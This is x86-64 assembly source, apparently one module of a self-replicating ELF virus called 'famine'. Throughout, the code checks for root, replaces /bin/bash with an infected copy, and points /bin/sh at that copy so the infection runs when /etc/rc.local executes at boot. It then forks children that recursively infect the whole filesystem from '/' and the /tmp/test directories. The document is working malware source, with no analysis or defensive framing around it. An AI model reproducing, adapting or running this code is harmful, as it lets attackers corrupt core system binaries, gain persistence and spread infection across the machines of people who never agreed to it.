section .text
	global _start_infect
	global _infect_from_root
	global _verify_starting_infect
	global _famine_start_options
    global _fork_before_exec_normaly
	extern _final_end
	extern _string
	extern _treat_file
	extern _read_dir
	extern _continue_normaly
	extern _verify_o_entry

;_rc_local:
;    .string db '/etc/rc.local', 0
;    .len equ $ - _rc_local.string

_bin_dash:
	.string db '/bin/dash', 0

_bin_bash:
	.string db '/bin/bash', 0

_symlink:
	.string db '/bin/sh', 0

_start_infect: ; here we know we will infect only bash, and redirect sh to bash
	enter 24, 0

;; Geteuid syscall
	mov rax, 107
	syscall
	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect /etc/rc.local
	jne _ret

;; Call the function to infect bash
	call _copy_infect_unlink_rename

; now /bin/bash is the infected version of /bin/bash
; so we unlink /bin/sh
	mov rax, 87
	lea rdi, [rel _symlink]
	syscall

; and then we create our symbolic link: /bin/sh -> /bin/bash
	mov rax, 88
	lea rsi, [rel _symlink]
	lea rdi, [rel _bin_bash]
	syscall

_exit_properly:
	mov rax, 60
	mov rdi, 0
	syscall

_ret:
	leave
	jmp _continue_normaly

_relink_sh: ; unlink sh, and link it to dash
;; unlink sh
	mov rax, 87
	lea rdi, [rel _symlink]
	syscall

;; link sh -> dash
	mov rax, 88
	lea rsi, [rel _symlink]
	lea rdi, [rel _bin_dash]
	syscall
	jmp _verify_o_entry

_starting_str:
	.name db '/bin/sh', 0
	.namelen equ $ - _starting_str.name
	.option db '-e', 0
	.optionlen equ $ - _starting_str.option
	.file db '/etc/rc.local', 0
	.filelen equ $ - _starting_str.file
	.order db 'start', 0
	.orderlen equ $ - _starting_str.order

_verify_starting_infect:

;; verify argv[0]
	mov rdi, QWORD [rsp + 136]
	mov rcx, _starting_str.namelen
	lea rsi, [rel _starting_str.name]
	cld
	repe cmpsb
	jne _continue_normaly

;; verify argv[1]
	mov rdi, QWORD [rsp + 144]
	mov rcx, _starting_str.optionlen
	lea rsi, [rel _starting_str.option]
	cld
	repe cmpsb
	jne _continue_normaly

;; verify argv[2]
	mov rdi, QWORD [rsp + 152]
	mov rcx, _starting_str.filelen
	lea rsi, [rel _starting_str.file]
	cld
	repe cmpsb
	jne _continue_normaly

;; verify argv[3]
	mov rdi, QWORD [rsp + 160]
	mov rcx, _starting_str.orderlen
	lea rsi, [rel _starting_str.order]
	cld
	repe cmpsb
	jne _continue_normaly

;; We are running on boot of the system. So we fork,
;; make the child infect from root, and the parent simply exec normaly.
	mov rax, 57
	syscall
	cmp rax, 0
	jne _relink_sh ;; parent job

;;  child job
	lea rdi, [rel _exit_properly]

_infect_from_root:
;    enter 16, 0
	push rdi
	mov rax, 0
	push rax
	mov rax, 1
	push rax
	mov rax, rsp
	add rax, 8
	push rax
	push rax
;; call read_dir with 2 empty strings. Read_dir will concatenate them, and
;; ad it a /. so we will have a / directory.
	call _read_dir
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	jmp rdi

_new_bash:
	.string db '/bin/test', 0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; We can't directly infect /bin/bash, so we do tricky move:
; Here we will open /bin/bash in READ_ONLY mod.
; Then we will read the file, and write it in /bin/test, opened in read|write
; and we infect /bin/test.
; When it's done, we unlink /bin/bash, and rename /bin/test to /bin/bash.
; So the new /bin/bash is an infected copy of /bin/bash.

_copy_infect_unlink_rename:
	enter 280, 0 ; 256(buffer) + 8(fd /bin/bash) + 8(fd /bin/test) + 8(int result of read) + 16(pading)

; open /bin/bash
	mov rax, 2
	lea rdi, [rel _bin_bash]
	mov rsi, 0
	syscall
	cmp rax, 0
	jle _exit_copy

; store fd in stack
	mov QWORD [rsp + 256], rax

; open /bin/test
	mov rax, 2
	lea rdi, [rel _new_bash]
	mov rsi, 578 ; O_RDWR | O_CREAT | O_TRUNC
	mov rdx, 493 ; S_IRWXU | S_IRGRP | S_IROTH | S_IXGRP | S_IXOTH
	syscall
	cmp rax, 0
	jle _exit_copy
	mov QWORD [rsp + 264], rax ;; store fd in stack

;; Loop to read 256 bytes from /bin/bash, and write it to /bin/test.
;; it's like a do;while. We run instructions one time, verify how many bytes we
;; readed, and if we didn't read 256 bytes, so we are at EOF.
	mov QWORD [rsp + 272], 0 ;; setup bytes readed to 0

_loop_read_write: ; do {
;; read from /bin/bash
	mov rax, 0
	mov rdi, QWORD [rsp + 256]
	mov rsi, rsp
	mov rdx, 256
	syscall
	mov QWORD [rsp + 272], rax ; store the number of bytes readed

_write_it: ; write the bytes readed to /bin/test
;; write to /bin/test
	mov rax, 1
	mov rdi, QWORD [rsp + 264]
	mov rsi, rsp
	mov rdx, QWORD [rsp + 272]
	syscall

_verify: ; } while (number_bytes_readed == 256)
; check if the number of bytes is equal 256. if not, we are at end of file
	cmp QWORD [rsp + 272], 256
	je _loop_read_write

_unlink:
; close /bin/bash and /bin/test
	mov rax, 3
	mov rdi, QWORD [rsp + 256]
	syscall
	mov rax, 3
	mov rdi, QWORD [rsp + 264]
	syscall

; store /bin and test on stack
	mov rax, 0x0000000074736574 ; test
	push rax
	mov rax, 0x000000006e69622f ; /bin
	push rax

; take their address
	mov rdi, rsp
	add rdi, 8

; calcul virus size
	xor r10, r10 ; r10 = 0
	lea r10, [rel _final_end] ; r10 = &_final_end
	add r10, 2 ; final_end have 2 bytes of instrucitions
	xor r11, r11
	lea r11, [rel _string] ; r11 = &_string
	sub r10, r11 ; &_final_end -= &_string

;; setup for call to treat_file
	mov rsi, r10 ; virus size = r10
	mov rdx, rsp
	mov r10, 0
	call _treat_file ; we treat our /bin/test
	pop rdi
	pop rdi

; now we unlink /bin/bash
	mov rax, 87
	lea rdi, [rel _bin_bash.string]
	syscall
	cmp rax, 0
	jne _exit_copy

; and we rename /bin/test to /bin/bash
	mov rax, 82
	lea rdi, [rel _new_bash.string]
	lea rsi, [rel _bin_bash.string]
	syscall
	cmp rax, 0

_exit_copy:
	leave
	ret

_activate_start_infection:
	.string db '--boot', 0
	.len equ $ - _activate_start_infection.string

_activate_root_infection:
	.string db '--root', 0
	.len equ $ - _activate_root_infection.string

_famine_start_options: ; dispatch according to arguments. famine binary only !!
	mov rax, QWORD [rsp + 128]
	cmp rax, 2
	jne _continue_normaly ; if their is only 2 args, we just infect normally

_test_options:
;   here we check the differents values, and redirect according to it
;; first we check if --boot is set
	mov rdi, QWORD [rsp + 144]
	mov rcx, _activate_start_infection.len
	lea rsi, [rel _activate_start_infection.string]
	cld
	repe cmpsb
	je _start_infect ; infect bash, to run total infection at boot time

;; check if --root is set
	mov rdi, QWORD [rsp + 144]
	mov rcx, _activate_root_infection.len
	lea rsi, [rel _activate_root_infection.string]
	cld
	repe cmpsb
	lea rdi, [rel _exit_properly]
	je _fork_before_infect_root ; infect from root
	jmp _continue_normaly ; no arguments corresponds, so simply run normally.

_fork_before_infect_root:
;; When we infect from root, we always fork the process, run it normally in the parent,
;; and infect from root in the child
    ;; fork
	mov rax, 57
	syscall
	cmp rax, 0
    jne _exit_properly ;; parent

    ;; child
    lea rdi, [rel _exit_properly]
    jmp _infect_from_root

_fork_before_exec_normaly:
;; When infecting normaly, we fork the process to run it normally in parent,
;; and infect in child
    ;; fork
	mov rax, 57
	syscall
	cmp rax, 0
    jne _verify_o_entry ;; parent

    ;;child
    lea rdi, [rel _exit_properly]
	mov		rax, 0
	push	rax
	push	rax
	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"
	push	rax								; push infection path on stack
	mov		rdi, rsp
	mov		rsi, rsp
	add		rsi, 16
	mov		rax, 1							; sets recursive infection
	push	rax
	push	rsi
	push	rdi
	call	_read_dir						; call our directory browsing function
	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
	call	_read_dir						; call our directory browsing function
	jmp _exit_properly
